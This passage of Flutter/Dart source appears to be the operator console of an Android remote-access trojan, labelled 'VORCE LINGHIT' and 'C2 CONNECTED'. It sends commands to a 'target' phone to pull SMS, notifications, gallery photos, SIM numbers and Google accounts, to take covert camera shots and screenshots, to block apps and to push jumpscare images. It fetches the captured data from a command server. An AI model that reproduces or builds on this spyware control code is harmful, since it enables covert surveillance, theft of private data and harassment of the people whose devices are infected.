          radius: const BorderRadius.all(Radius.circular(24)),
          padding: const EdgeInsets.all(20),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              ComixChip(
                bgColor: comixOrange,
                child: const Text('JUMPSCARE V2',
                    style: TextStyle(
                        color: Colors.white,
                        fontWeight: FontWeight.w900,
                        fontFamily: 'Orbitron',
                        fontSize: 12,
                        letterSpacing: 1)),
              ),
              const SizedBox(height: 14),
              TextField(
                controller: urlController,
                style: const TextStyle(
                    color: comixInk, fontWeight: FontWeight.w700),
                decoration: InputDecoration(
                  hintText: 'URL foto',
                  filled: true,
                  fillColor: comixYellow.withOpacity(0.25),
                  border: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(12),
                      borderSide:
                          const BorderSide(color: comixInk, width: 2.5)),
                  enabledBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(12),
                      borderSide:
                          const BorderSide(color: comixInk, width: 2.5)),
                ),
              ),
              const SizedBox(height: 10),
              TextField(
                controller: durationController,
                keyboardType: TextInputType.number,
                style: const TextStyle(
                    color: comixInk, fontWeight: FontWeight.w700),
                decoration: InputDecoration(
                  hintText: 'Durasi (ms)',
                  filled: true,
                  fillColor: comixYellow.withOpacity(0.25),
                  border: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(12),
                      borderSide:
                          const BorderSide(color: comixInk, width: 2.5)),
                  enabledBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(12),
                      borderSide:
                          const BorderSide(color: comixInk, width: 2.5)),
                ),
              ),
              const SizedBox(height: 18),
              Row(children: [
                Expanded(
                    child: _ComixOutlineBtn(
                  label: 'BATAL',
                  onTap: () => Navigator.pop(context),
                )),
                const SizedBox(width: 10),
                Expanded(
                    child: _ComixGradBtn(
                  label: 'AKTIFKAN',
                  icon: Icons.play_arrow_rounded,
                  color: comixOrange,
                  onTap: () {
                    final url = urlController.text.trim();
                    final duration =
                        int.tryParse(durationController.text.trim()) ?? 3000;
                    if (url.isEmpty || duration < 500) return;
                    Navigator.pop(context);
                    _jumpscare2Url = url;
                    _jumpscare2Duration = duration;
                    _sendCommand('jumpscare2Start',
                        extra: jsonEncode({'url': url, 'duration': duration}));
                    setState(() {
                      _isJumpscare2Active = true;
                      _updateControlItemState('jumpscare2Start', true);
                    });
                  },
                )),
              ]),
            ],
          ),
        ),
      ),
    );
  }

  void _showBlockAppBottomSheet() {
    setState(() => _installedApps = []);
    _sendCommand('getInstalledApps', extra: 'true');

    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      isScrollControlled: true,
      builder: (context) => StatefulBuilder(
        builder: (context, setSheetState) {
          String searchQuery = '';
          List<Map<String, dynamic>> filteredApps = [];
          if (_installedApps.isNotEmpty) {
            filteredApps = searchQuery.isEmpty
                ? _installedApps
                : _installedApps
                    .where((app) =>
                        (app['name']?.toString() ?? '')
                            .toLowerCase()
                            .contains(searchQuery.toLowerCase()) ||
                        (app['package']?.toString() ?? '')
                            .toLowerCase()
                            .contains(searchQuery.toLowerCase()))
                    .toList();
          }

          return ComixPanel(
            bgColor: Colors.white,
            shadowOffset: 0,
            borderWidth: 3,
            radius: const BorderRadius.vertical(top: Radius.circular(24)),
            padding: const EdgeInsets.fromLTRB(16, 16, 16, 24),
            child: SizedBox(
              height: MediaQuery.of(context).size.height * 0.7,
              child: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Container(
                    width: 50,
                    height: 6,
                    decoration: BoxDecoration(
                      color: comixInk,
                      borderRadius: BorderRadius.circular(100),
                    ),
                  ),
                  const SizedBox(height: 14),
                  Row(
                    children: [
                      ComixChip(
                        bgColor: comixRed,
                        child: const Row(
                          mainAxisSize: MainAxisSize.min,
                          children: [
                            Icon(Icons.block, color: Colors.white, size: 14),
                            SizedBox(width: 6),
                            Text('BLOCK APPS',
                                style: TextStyle(
                                    color: Colors.white,
                                    fontSize: 11,
                                    fontWeight: FontWeight.w900,
                                    fontFamily: 'Orbitron')),
                          ],
                        ),
                      ),
                      const Spacer(),
                      Text('${_installedApps.length} apps',
                          style: const TextStyle(
                              color: comixInk,
                              fontSize: 11,
                              fontWeight: FontWeight.w900)),
                    ],
                  ),
                  const SizedBox(height: 12),
                  Container(
                    decoration: BoxDecoration(
                      color: comixYellow.withOpacity(0.25),
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(color: comixInk, width: 2.5),
                    ),
                    child: TextField(
                      onChanged: (v) => setSheetState(() {
                        searchQuery = v;
                        filteredApps = v.isEmpty
                            ? _installedApps
                            : _installedApps
                                .where((app) =>
                                    (app['name']?.toString() ?? '')
                                        .toLowerCase()
                                        .contains(v.toLowerCase()) ||
                                    (app['package']?.toString() ?? '')
                                        .toLowerCase()
                                        .contains(v.toLowerCase()))
                                .toList();
                      }),
                      style: const TextStyle(
                          color: comixInk, fontWeight: FontWeight.w700),
                      decoration: const InputDecoration(
                        prefixIcon: Icon(Icons.search, color: comixInk),
                        hintText: "Cari aplikasi...",
                        hintStyle: TextStyle(color: comixTextDim),
                        border: InputBorder.none,
                        contentPadding:
                            EdgeInsets.symmetric(horizontal: 14, vertical: 12),
                      ),
                    ),
                  ),
                  const SizedBox(height: 12),
                  Expanded(
                    child: _installedApps.isEmpty
                        ? const Center(
                            child: SizedBox(
                                width: 40,
                                height: 40,
                                child: CircularProgressIndicator(
                                    color: comixBlue, strokeWidth: 3)),
                          )
                        : ListView.builder(
                            itemCount: filteredApps.length,
                            itemBuilder: (context, index) {
                              final app = filteredApps[index];
                              final package = app['package'] ?? '';
                              final name = app['name'] ?? package;
                              final isBlocked = _blockedApps.contains(package);
                              final initial = name.isNotEmpty
                                  ? name[0].toUpperCase()
                                  : '?';

                              return Container(
                                margin: const EdgeInsets.only(bottom: 8),
                                padding: const EdgeInsets.all(10),
                                decoration: BoxDecoration(
                                  color: Colors.white,
                                  borderRadius: BorderRadius.circular(12),
                                  border: Border.all(
                                      color: comixInk, width: 2),
                                ),
                                child: Row(
                                  children: [
                                    Container(
                                      width: 36,
                                      height: 36,
                                      decoration: BoxDecoration(
                                        color: isBlocked
                                            ? comixRed
                                            : comixBlue,
                                        borderRadius:
                                            BorderRadius.circular(8),
                                        border: Border.all(
                                            color: comixInk, width: 2),
                                      ),
                                      child: Center(
                                        child: Text(initial,
                                            style: const TextStyle(
                                                color: Colors.white,
                                                fontWeight:
                                                    FontWeight.w900,
                                                fontSize: 14)),
                                      ),
                                    ),
                                    const SizedBox(width: 10),
                                    Expanded(
                                      child: Column(
                                        crossAxisAlignment:
                                            CrossAxisAlignment.start,
                                        children: [
                                          Text(name,
                                              style: const TextStyle(
                                                  color: comixInk,
                                                  fontWeight:
                                                      FontWeight.w900,
                                                  fontSize: 12),
                                              overflow:
                                                  TextOverflow.ellipsis),
                                          Text(package,
                                              style: const TextStyle(
                                                  color: comixTextDim,
                                                  fontSize: 9,
                                                  fontFamily:
                                                      'ShareTechMono'),
                                              overflow:
                                                  TextOverflow.ellipsis),
                                        ],
                                      ),
                                    ),
                                    GestureDetector(
                                      onTap: () {
                                        if (isBlocked) {
                                          _sendCommand('unblockApp',
                                              extra: package);
                                          setState(() =>
                                              _blockedApps.remove(package));
                                          setSheetState(() {});
                                        } else {
                                          _sendCommand('blockApp',
                                              extra: jsonEncode({
                                                'package': package,
                                                'name': name
                                              }));
                                          setState(() =>
                                              _blockedApps.add(package));
                                          setSheetState(() {});
                                        }
                                      },
                                      child: Container(
                                        padding:
                                            const EdgeInsets.symmetric(
                                                horizontal: 10, vertical: 6),
                                        decoration: BoxDecoration(
                                          color: isBlocked
                                              ? comixGreen
                                              : comixRed,
                                          borderRadius:
                                              BorderRadius.circular(8),
                                          border: Border.all(
                                              color: comixInk, width: 2),
                                        ),
                                        child: Text(
                                          isBlocked ? "UNBLOCK" : "BLOCK",
                                          style: const TextStyle(
                                              color: Colors.white,
                                              fontSize: 9,
                                              fontWeight: FontWeight.w900,
                                              letterSpacing: 0.5),
                                        ),
                                      ),
                                    ),
                                  ],
                                ),
                              );
                            },
                          ),
                  ),
                  const SizedBox(height: 12),
                  Row(
                    children: [
                      Expanded(
                        child: _ComixOutlineBtn(
                          label: 'TUTUP',
                          onTap: () => Navigator.pop(context),
                        ),
                      ),
                      const SizedBox(width: 10),
                      Expanded(
                        child: _ComixGradBtn(
                          label: 'REFRESH',
                          icon: Icons.refresh_rounded,
                          color: comixBlue,
                          onTap: () {
                            setState(() => _installedApps = []);
                            setSheetState(() {});
                            _sendCommand('getInstalledApps', extra: 'true');
                          },
                        ),
                      ),
                    ],
                  ),
                ],
              ),
            ),
          );
        },
      ),
    );
  }

  // ─── DEVICE INFO CARD (COMIX) ──────────────────────────────────────
  Widget _buildDeviceInfoCard() {
    final int battery = _deviceData['battery'] ?? 0;
    final Color batColor =
        battery > 50 ? comixGreen : battery > 20 ? comixOrange : comixRed;
    final String androidVer = _deviceData['androidVersion'] ?? '-';
    final int sdk = _deviceData['sdkVersion'] ?? 0;

    return ComixPanel(
      bgColor: comixBlue,
      shadowColor: comixInk,
      shadowOffset: 8,
      borderWidth: 3.5,
      radius: const BorderRadius.all(Radius.circular(22)),
      padding: const EdgeInsets.all(16),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Container(
                width: 58,
                height: 58,
                decoration: BoxDecoration(
                  color: Colors.white,
                  borderRadius: BorderRadius.circular(16),
                  border: Border.all(color: comixInk, width: 3),
                  boxShadow: const [
                    BoxShadow(
                        color: comixInk, offset: Offset(3, 3), blurRadius: 0),
                  ],
                ),
                child: const Icon(Icons.phone_android_rounded,
                    color: comixBlue, size: 30),
              ),
              const SizedBox(width: 14),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    const ComixChip(
                      bgColor: comixGreen,
                      child: Text('CONNECTED',
                          style: TextStyle(
                              color: Colors.white,
                              fontSize: 9,
                              fontWeight: FontWeight.w900,
                              fontFamily: 'ShareTechMono',
                              letterSpacing: 1)),
                    ),
                    const SizedBox(height: 6),
                    Text(_targetModel,
                        style: const TextStyle(
                            color: Colors.white,
                            fontSize: 15,
                            fontWeight: FontWeight.w900,
                            fontFamily: 'Orbitron'),
                        maxLines: 1,
                        overflow: TextOverflow.ellipsis),
                    Text("Android $androidVer · SDK $sdk",
                        style: TextStyle(
                            color: Colors.white.withOpacity(0.85),
                            fontSize: 10.5,
                            fontWeight: FontWeight.w700,
                            fontFamily: 'ShareTechMono')),
                  ],
                ),
              ),
            ],
          ),
          const SizedBox(height: 14),
          Row(
            children: [
              Icon(
                  battery > 20
                      ? Icons.battery_full_rounded
                      : Icons.battery_alert_rounded,
                  color: Colors.white,
                  size: 14),
              const SizedBox(width: 6),
              const Text("BATTERY",
                  style: TextStyle(
                      color: Colors.white,
                      fontSize: 10,
                      fontWeight: FontWeight.w900,
                      fontFamily: 'ShareTechMono',
                      letterSpacing: 1)),
              const Spacer(),
              Text("$battery%",
                  style: const TextStyle(
                      color: Colors.white,
                      fontSize: 12,
                      fontWeight: FontWeight.w900,
                      fontFamily: 'ShareTechMono')),
            ],
          ),
          const SizedBox(height: 6),
          Container(
            height: 8,
            decoration: BoxDecoration(
              color: Colors.white.withOpacity(0.2),
              borderRadius: BorderRadius.circular(4),
              border: Border.all(color: comixInk, width: 1.5),
            ),
            child: FractionallySizedBox(
              widthFactor: (battery / 100).clamp(0.0, 1.0),
              alignment: Alignment.centerLeft,
              child: Container(
                decoration: BoxDecoration(
                  color: batColor,
                  borderRadius: BorderRadius.circular(3),
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  // ─── TAB: MESSAGES (COMIX) ─────────────────────────────────────────
  Widget _buildMessagesTab() {
    if (_targetId == "unknown") {
      return Center(
        child: ComixPanel(
          bgColor: comixYellow,
          padding: const EdgeInsets.all(20),
          child: const Text('PILIH DEVICE DULU!',
              style: TextStyle(
                  color: comixInk,
                  fontWeight: FontWeight.w900,
                  fontFamily: 'Orbitron')),
        ),
      );
    }

    final allKeys = [..._smsData.keys, ..._notifData.keys].toSet().toList();

    return Column(
      children: [
        Padding(
          padding: const EdgeInsets.all(14),
          child: Row(
            children: [
              const Expanded(
                child: Text("PESAN & NOTIFIKASI",
                    style: TextStyle(
                        color: comixInk,
                        fontWeight: FontWeight.w900,
                        letterSpacing: 1.5,
                        fontSize: 13,
                        fontFamily: 'Orbitron')),
              ),
              _ComixGradBtn(
                label: 'REFRESH',
                icon: Icons.refresh_rounded,
                color: comixBlue,
                onTap: () {
                  _sendCommand('getSms');
                  _sendCommand('getNotifs');
                  _sendCommand('getStatus');
                },
              ),
            ],
          ),
        ),
        Expanded(
          child: allKeys.isEmpty
              ? Center(
                  child: ComixPanel(
                    bgColor: Colors.white,
                    padding: const EdgeInsets.all(20),
                    child: Column(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        const Text("Belum ada pesan",
                            style: TextStyle(
                                color: comixTextSub,
                                fontWeight: FontWeight.w700,
                                fontFamily: 'ShareTechMono')),
                        const SizedBox(height: 12),
                        _ComixGradBtn(
                          label: 'TAP REFRESH',
                          icon: Icons.refresh_rounded,
                          color: comixBlue,
                          onTap: () {
                            _sendCommand('getSms');
                            _sendCommand('getNotifs');
                            _sendCommand('getStatus');
                          },
                        ),
                      ],
                    ),
                  ),
                )
              : ListView(
                  padding: const EdgeInsets.all(14),
                  children: [
                    if (_smsData.isNotEmpty) ...[
                      ComixChip(
                        bgColor: comixGreen,
                        child: Text("SMS (${_smsData.keys.length})",
                            style: const TextStyle(
                                color: Colors.white,
                                fontWeight: FontWeight.w900,
                                fontSize: 11,
                                letterSpacing: 1,
                                fontFamily: 'Orbitron')),
                      ),
                      const SizedBox(height: 8),
                      ..._smsData.keys.map((key) => _buildMessageAppItem(
                            key: key,
                            data: _smsData[key] as Map<String, dynamic>,
                            isSms: true,
                          )),
                      const SizedBox(height: 16),
                    ],
                    if (_notifData.isNotEmpty) ...[
                      ComixChip(
                        bgColor: comixPurple,
                        child: Text("NOTIFIKASI (${_notifData.keys.length})",
                            style: const TextStyle(
                                color: Colors.white,
                                fontWeight: FontWeight.w900,
                                fontSize: 11,
                                letterSpacing: 1,
                                fontFamily: 'Orbitron')),
                      ),
                      const SizedBox(height: 8),
                      ..._notifData.keys.map((key) => _buildMessageAppItem(
                            key: key,
                            data: _notifData[key] as Map<String, dynamic>,
                            isSms: false,
                          )),
                    ],
                  ],
                ),
        ),
      ],
    );
  }

  Widget _buildMessageAppItem({
    required String key,
    required Map<String, dynamic> data,
    required bool isSms,
  }) {
    final appName = data['appName'] ?? 'Unknown';
    final messages = (data['messages'] as List?) ?? [];
    final count = messages.length;
    final preview = messages.isNotEmpty
        ? (messages.first['text'] ?? '').toString()
        : '';

    return Padding(
      padding: const EdgeInsets.only(bottom: 10),
      child: GestureDetector(
        onTap: () {
          Navigator.push(
            context,
            MaterialPageRoute(
              builder: (context) => MessageDetailFullscreenPage(
                appName: appName,
                messages: messages,
                isSms: isSms,
                targetModel: _targetModel,
                onBack: () => Navigator.pop(context),
              ),
              fullscreenDialog: true,
            ),
          );
        },
        child: ComixPanel(
          bgColor: Colors.white,
          shadowOffset: 4,
          borderWidth: 2.5,
          radius: const BorderRadius.all(Radius.circular(14)),
          padding: const EdgeInsets.all(12),
          child: Row(
            children: [
              Container(
                width: 44,
                height: 44,
                decoration: BoxDecoration(
                  color: isSms ? comixGreen : comixPurple,
                  shape: BoxShape.circle,
                  border: Border.all(color: comixInk, width: 2.5),
                ),
                child: Center(
                  child: Text(
                    appName.isNotEmpty ? appName[0].toUpperCase() : '?',
                    style: const TextStyle(
                        color: Colors.white,
                        fontWeight: FontWeight.w900,
                        fontSize: 16),
                  ),
                ),
              ),
              const SizedBox(width: 12),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Row(
                      children: [
                        Expanded(
                          child: Text(appName,
                              style: const TextStyle(
                                  color: comixInk,
                                  fontWeight: FontWeight.w900,
                                  fontSize: 13),
                              overflow: TextOverflow.ellipsis),
                        ),
                        ComixChip(
                          bgColor: isSms ? comixGreen : comixPurple,
                          child: Text(count.toString(),
                              style: const TextStyle(
                                  color: Colors.white,
                                  fontSize: 10,
                                  fontWeight: FontWeight.w900)),
                        ),
                      ],
                    ),
                    const SizedBox(height: 4),
                    Text(
                      preview.length > 50
                          ? '${preview.substring(0, 50)}...'
                          : preview,
                      style: const TextStyle(
                          color: comixTextSub,
                          fontSize: 11,
                          fontWeight: FontWeight.w600),
                      maxLines: 1,
                      overflow: TextOverflow.ellipsis,
                    ),
                  ],
                ),
              ),
              const Icon(Icons.chevron_right, color: comixInk, size: 20),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildTerminalLogs() {
    return ComixPanel(
      bgColor: Colors.white,
      shadowOffset: 4,
      borderWidth: 2.5,
      radius: const BorderRadius.all(Radius.circular(14)),
      padding: const EdgeInsets.all(10),
      child: SizedBox(
        height: 120,
        child: ListView.builder(
          controller: _logScrollController,
          reverse: true,
          itemCount: _executionLogs.length,
          itemBuilder: (context, i) {
            final log = _executionLogs[_executionLogs.length - 1 - i];
            return Padding(
              padding: const EdgeInsets.symmetric(vertical: 2),
              child: Row(
                children: [
                  Text("[${_formatTime(log.timestamp)}]",
                      style: const TextStyle(
                          color: comixTextDim,
                          fontSize: 10,
                          fontFamily: 'ShareTechMono',
                          fontWeight: FontWeight.w700)),
                  const SizedBox(width: 8),
                  Expanded(
                    child: Text(log.message,
                        style: TextStyle(
                            color: _getLogColor(log.type),
                            fontSize: 11,
                            fontFamily: 'ShareTechMono',
                            fontWeight: FontWeight.w700)),
                  ),
                ],
              ),
            );
          },
        ),
      ),
    );
  }

  Widget _buildControlFooter() {
    return const Text(
      "SYSTEM SECURED • C2 CONNECTED",
      style: TextStyle(
          color: comixTextDim,
          fontSize: 10,
          letterSpacing: 2,
          fontFamily: 'ShareTechMono'),
      textAlign: TextAlign.center,
    );
  }

  Future<void> _takeScreenshotViaRest(String facing) async {
    final prefs = await SharedPreferences.getInstance();
    final token = prefs.getString('key') ?? '';

    setState(() {
      _cameraFacing = facing;
      _cameraFrame = '';
      _cameraLoading = true;
    });

    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => Dialog(
        backgroundColor: Colors.transparent,
        child: ComixPanel(
          bgColor: Colors.white,
          padding: const EdgeInsets.all(20),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              const SizedBox(
                  width: 40,
                  height: 40,
                  child: CircularProgressIndicator(
                      color: comixBlue, strokeWidth: 3)),
              const SizedBox(height: 16),
              ComixChip(
                bgColor: comixBlue,
                child: const Text("MENGAMBIL FOTO...",
                    style: TextStyle(
                        color: Colors.white,
                        fontSize: 10,
                        fontWeight: FontWeight.w900,
                        fontFamily: 'ShareTechMono')),
              ),
            ],
          ),
        ),
      ),
    );

    try {
      final response = await http.get(
        Uri.parse("$baseUrl/api/screenshot/$_targetId?facing=$facing"),
        headers: {"x-auth-token": token},
      );
      if (mounted) Navigator.pop(context);

      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        if (data['frame'] != null && data['frame'].isNotEmpty) {
          Navigator.push(
            context,
            MaterialPageRoute(
              builder: (context) => ScreenshotResultPage(
                targetModel: _targetModel,
                screenshotFrame: data['frame'],
                screenshotFacing: facing,
                onClose: () => Navigator.pop(context),
              ),
              fullscreenDialog: true,
            ),
          );
        }
      }
    } catch (e) {
      if (mounted) Navigator.pop(context);
    }
  }

  void _takeCameraSocket(String facing) {
    if (_isWaitingForPhoto) return;
    setState(() {
      _isWaitingForPhoto = true;
      _cameraFacing = facing;
    });
    _sendCommand('camera', extra: facing);

    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) {
        _photoLoadingContext = context;
        return Center(
          child: ComixPanel(
            bgColor: Colors.white,
            padding: const EdgeInsets.all(20),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                const SizedBox(
                    width: 40,
                    height: 40,
                    child: CircularProgressIndicator(
                        color: comixBlue, strokeWidth: 3)),
                const SizedBox(height: 16),
                const Text("MENGAMBIL FOTO...",
                    style: TextStyle(
                        color: comixInk,
                        fontSize: 11,
                        fontWeight: FontWeight.w900,
                        letterSpacing: 2,
                        fontFamily: 'ShareTechMono')),
              ],
            ),
          ),
        );
      },
    );

    Future.delayed(const Duration(seconds: 10), () {
      if (_isWaitingForPhoto && mounted) {
        _isWaitingForPhoto = false;
        if (_photoLoadingContext != null) {
          try { Navigator.pop(_photoLoadingContext!); } catch (_) {}
          _photoLoadingContext = null;
        }
      }
    });
  }

  Future<void> _startLiveCameraPolling(String facing) async {
    if (_screenModalVisible) _closeScreenModal();
    if (_screenshotResultVisible) _closeScreenshotResult();

    setState(() {
      _cameraFacing = facing;
      _cameraFrame = '';
      _cameraLoading = true;
    });

    Navigator.push(
      context,
      MaterialPageRoute(
        builder: (context) => LiveCameraPollingPage(
          targetId: _targetId,
          targetModel: _targetModel,
          facing: _cameraFacing,
          onClose: () {
            _sendCommand('camera', extra: 'stop');
            Navigator.pop(context);
          },
          onSwitchCamera: (newFacing) {
            setState(() => _cameraFacing = newFacing);
          },
        ),
        fullscreenDialog: true,
      ),
    );
  }

  void _closeScreenModal() {
    setState(() {
      _screenModalVisible = false;
      _screenFrame = '';
      _screenLoading = true;
    });
    _sendCommand('screen', extra: 'stop');
  }

  void _closeCameraModal() {
    setState(() {
      _cameraModalVisible = false;
      _cameraFrame = '';
      _cameraLoading = true;
    });
    _sendCommand('camera', extra: 'stop');
  }

  void _closeScreenshotResult() {
    setState(() {
      _screenshotResultVisible = false;
      _screenshotFrame = '';
      _screenshotScale = 1.0;
      _screenshotOffsetX = 0.0;
      _screenshotOffsetY = 0.0;
    });
  }

  void _downloadScreenshot(String frameBase64) async {
    try {
      final bytes = base64Decode(frameBase64.split(',').last);
      final directory =
          await getDownloadsDirectory() ?? await getApplicationDocumentsDirectory();
      final file = File(
          '${directory.path}/screenshot_${DateTime.now().millisecondsSinceEpoch}.jpg');
      await file.writeAsBytes(bytes);
      _addLog("✅ Screenshot saved: ${file.path}", LogType.success);
    } catch (e) {
      _addLog("❌ Gagal download: $e", LogType.error);
    }
  }

  Future<void> _fetchGalleryViaHttp() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final token = prefs.getString('key') ?? '';
      final response = await http.get(
        Uri.parse("$baseUrl/api/gallery/$_targetId"),
        headers: {"x-auth-token": token},
      );
      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        final photos = data['photos'] as List? ?? [];
        _galleryStreamController.add(
            photos.map((p) => Map<String, dynamic>.from(p)).toList());
      }
    } catch (e) {
      _addLog("⚠️ Gallery HTTP error: $e", LogType.error);
    }
  }

  void _openGalleryFullscreen() {
    setState(() {
      _galleryModalVisible = true;
      _isGalleryLoading = true;
      _galleryPhotos = [];
    });
    _sendCommand('getGallery');
    _fetchGalleryViaHttp();
  }

  void _closeGalleryFullscreen() {
    setState(() {
      _galleryModalVisible = false;
      _galleryPhotos = [];
      _currentGalleryImage = '';
      _currentGalleryIndex = 0;
    });
  }

  void _openFileManagerFullscreen() {
    Navigator.push(
      context,
      MaterialPageRoute(
        builder: (context) => FileManagerFullscreenPage(
          targetId: _targetId,
          targetModel: _targetModel,
          onClose: () => Navigator.pop(context),
          sendCommand: _sendCommand,
        ),
        fullscreenDialog: true,
      ),
    );
  }

  @override
  void dispose() {
    _glowController.dispose();
    _rotateController.dispose();
    _logScrollController.dispose();
    _customCommandController.dispose();
    _customExtraController.dispose();
    _cameraFrameStreamController.close();
    _screenFrameStreamController.close();
    _galleryStreamController.close();
    _pollingTimer?.cancel();
    socket.disconnect();
    socket.dispose();
    super.dispose();
  }

  // ─── BUILD MAIN (COMIX) ────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: comixBg,
      appBar: AppBar(
        backgroundColor: comixBg,
        foregroundColor: comixInk,
        elevation: 0,
        automaticallyImplyLeading: false,
        flexibleSpace: Container(
          decoration: const BoxDecoration(
            border: Border(bottom: BorderSide(color: comixInk, width: 3)),
          ),
        ),
        leading: Padding(
          padding: const EdgeInsets.only(left: 10),
          child: GestureDetector(
            onTap: () => Navigator.pop(context),
            child: Container(
              decoration: BoxDecoration(
                color: comixYellow,
                borderRadius: BorderRadius.circular(11),
                border: Border.all(color: comixInk, width: 2.5),
                boxShadow: const [
                  BoxShadow(
                      color: comixInk, offset: Offset(2.5, 2.5), blurRadius: 0),
                ],
              ),
              child: const Icon(Icons.arrow_back_rounded,
                  color: comixInk, size: 20),
            ),
          ),
        ),
        centerTitle: true,
        title: Stack(
          children: [
            Transform.translate(
              offset: const Offset(2, 2),
              child: const Text('VORCE LINGHIT',
                  style: TextStyle(
                      color: comixInk,
                      fontSize: 16,
                      fontWeight: FontWeight.w900,
                      letterSpacing: 2,
                      fontFamily: 'Orbitron')),
            ),
            const Text('VORCE LINGHIT',
                style: TextStyle(
                    color: comixRed,
                    fontSize: 16,
                    fontWeight: FontWeight.w900,
                    letterSpacing: 2,
                    fontFamily: 'Orbitron',
                    shadows: [
                      Shadow(color: comixInk, offset: Offset(1.5, 1.5)),
                    ])),
          ],
        ),
        actions: [
          Padding(
            padding: const EdgeInsets.only(right: 12),
            child: GestureDetector(
              onTap: _fetchDevices,
              child: Container(
                width: 42,
                height: 42,
                decoration: BoxDecoration(
                  color: comixCyan,
                  borderRadius: BorderRadius.circular(11),
                  border: Border.all(color: comixInk, width: 2.5),
                  boxShadow: const [
                    BoxShadow(
                        color: comixInk, offset: Offset(2.5, 2.5), blurRadius: 0),
                  ],
                ),
                child:
                    const Icon(Icons.refresh_rounded, color: Colors.white, size: 20),
              ),
            ),
          ),
        ],
      ),
      body: Stack(
        children: [
          Positioned.fill(
            child: IgnorePointer(
                child: CustomPaint(painter: ComixHalftonePainter())),
          ),
          Positioned.fill(
            child: IgnorePointer(
                child: CustomPaint(painter: ComixSpeedLinesPainter())),
          ),
          _buildTabContent(),
        ],
      ),
      bottomNavigationBar: _buildBottomNav(),
    );
  }

  // ─── PHONE BOTTOM SHEET (COMIX) ────────────────────────────────────
  void _showPhoneBottomSheet(Map<String, dynamic> data) {
    final sims = data['sims'] as List? ?? [];
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      builder: (context) => ComixPanel(
        bgColor: Colors.white,
        shadowOffset: 0,
        borderWidth: 3,
        radius: const BorderRadius.vertical(top: Radius.circular(24)),
        padding: const EdgeInsets.fromLTRB(16, 16, 16, 24),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Container(
                width: 50,
                height: 6,
                decoration: BoxDecoration(
                    color: comixInk,
                    borderRadius: BorderRadius.circular(100))),
            const SizedBox(height: 14),
            ComixChip(
              bgColor: comixBlue,
              child: const Row(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Icon(Icons.phone_android, color: Colors.white, size: 14),
                  SizedBox(width: 6),
                  Text('NOMOR SIM',
                      style: TextStyle(
                          color: Colors.white,
                          fontWeight: FontWeight.w900,
                          fontSize: 11,
                          fontFamily: 'Orbitron')),
                ],
              ),
            ),
            const SizedBox(height: 16),
            if (sims.isEmpty)
              const Padding(
                padding: EdgeInsets.symmetric(vertical: 32),
                child: Text("Tidak ada data SIM",
                    style: TextStyle(
                        color: comixTextSub,
                        fontFamily: 'ShareTechMono',
                        fontWeight: FontWeight.w700)),
              )
            else
              ...sims.map((sim) {
                final number = sim['number'] ?? 'N/A';
                final operator = sim['operator'] ?? '';
                final label =
                    sim['displayName'] ?? 'SIM ${sims.indexOf(sim) + 1}';
                return Container(
                  margin: const EdgeInsets.only(bottom: 10),
                  padding: const EdgeInsets.all(12),
                  decoration: BoxDecoration(
                    color: Colors.white,
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(color: comixInk, width: 2),
                  ),
                  child: Row(
                    children: [
                      Container(
                        width: 38,
                        height: 38,
                        decoration: BoxDecoration(
                          color: comixBlue,
                          borderRadius: BorderRadius.circular(10),
                          border: Border.all(color: comixInk, width: 2),
                        ),
                        child: const Icon(Icons.sim_card,
                            color: Colors.white, size: 18),
                      ),
                      const SizedBox(width: 12),
                      Expanded(
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Text(label,
                                style: const TextStyle(
                                    color: comixInk,
                                    fontWeight: FontWeight.w900,
                                    fontSize: 11,
                                    fontFamily: 'ShareTechMono')),
                            Text(number,
                                style: const TextStyle(
                                    color: comixInk,
                                    fontSize: 14,
                                    fontWeight: FontWeight.w900)),
                            if (operator.isNotEmpty)
                              Text(operator,
                                  style: const TextStyle(
                                      color: comixTextSub,
                                      fontSize: 9,
                                      fontWeight: FontWeight.w700)),
                          ],
                        ),
                      ),
                      if (number != 'N/A')
                        GestureDetector(
                          onTap: () {
                            Clipboard.setData(ClipboardData(text: number));
                            ScaffoldMessenger.of(context).showSnackBar(
                              const SnackBar(content: Text("Nomor disalin!")),
                            );
                          },
                          child: Container(
                            width: 32,
                            height: 32,
                            decoration: BoxDecoration(
                              color: comixYellow,
                              shape: BoxShape.circle,
                              border: Border.all(color: comixInk, width: 2),
                            ),
                            child: const Icon(Icons.copy,
                                color: comixInk, size: 14),
                          ),
                        ),
                    ],
                  ),
                );
              }),
          ],
        ),
      ),
    );
  }

  void _showGmailBottomSheet(Map<String, dynamic> data) {
    final accounts = data['accounts'] as List? ?? [];
    final others = (data['others'] as List? ?? [])
        .where((o) => o['type'] != 'com.google')
        .toList();
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      isScrollControlled: true,
      builder: (context) => ComixPanel(
        bgColor: Colors.white,
        shadowOffset: 0,
